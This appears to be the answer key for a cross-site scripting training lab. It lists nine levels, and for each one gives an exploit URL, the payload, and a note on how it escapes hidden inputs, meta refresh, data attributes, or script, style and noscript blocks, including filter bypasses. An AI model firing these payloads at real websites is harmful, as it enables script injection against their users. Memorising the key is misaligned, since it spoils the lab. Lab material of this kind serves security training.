# hidden — solutions

Reflection in hidden / non-visible sinks: `<input type=hidden>`, meta refresh, data attributes, JSON/CSS/noscript blocks.

### hidden-reflection-level1

`/hidden-reflection/level1/?query=%22%20type=text%20autofocus%20onfocus=alert(1)%20x=%22`

- payload: `" type=text autofocus onfocus=alert(1) x="`
- context: `<input type="hidden" value="...">` — override type so autofocus/onfocus fires

### hidden-xss-level1

`/hidden/level1/?query=%22%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `"><script>alert(1)</script>`
- context: `<input type="hidden" value="...">` — raw, break out and inject

### hidden-reflection-level2

`/hidden-reflection/level2/?query=javascript:alert(1)`

- payload: `javascript:alert(1)`
- context: meta refresh `content="0;url=..."` — javascript URI works here

### hidden-xss-level2

`/hidden/level2/?query=%22%20type=text%20autofocus%20onfocus=alert(1)%20x=%22`

- payload: `" type=text autofocus onfocus=alert(1) x="`
- context: hidden input; `<`,`>` stripped — use attribute breakout + type override

### hidden-reflection-level3

`/hidden-reflection/level3/?query=%22%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `"><script>alert(1)</script>`
- context: `<img data-original="...">` — break out of attribute

### hidden-xss-level3

`/hidden/level3/?query=%22/type=text/autofocus/onfocus=alert(1)//x=%22`

- payload: `"/type=text/autofocus/onfocus=alert(1)//x="`
- context: hidden input; `<`,`>`,space stripped — use `/` as attribute separator

### hidden-reflection-level4

`/hidden-reflection/level4/?query=%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `</script><script>alert(1)</script>`
- context: inside `<script type="application/json">`; close script and start a new one

### hidden-reflection-level5

`/hidden-reflection/level5/?query=red%7D%3C/style%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `red}</style><script>alert(1)</script>`
- context: inside `<style>` block; close style then inject

### hidden-reflection-level6

`/hidden-reflection/level6/?query=%3C/noscript%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `</noscript><script>alert(1)</script>`
- context: inside `<noscript>`; close it then inject
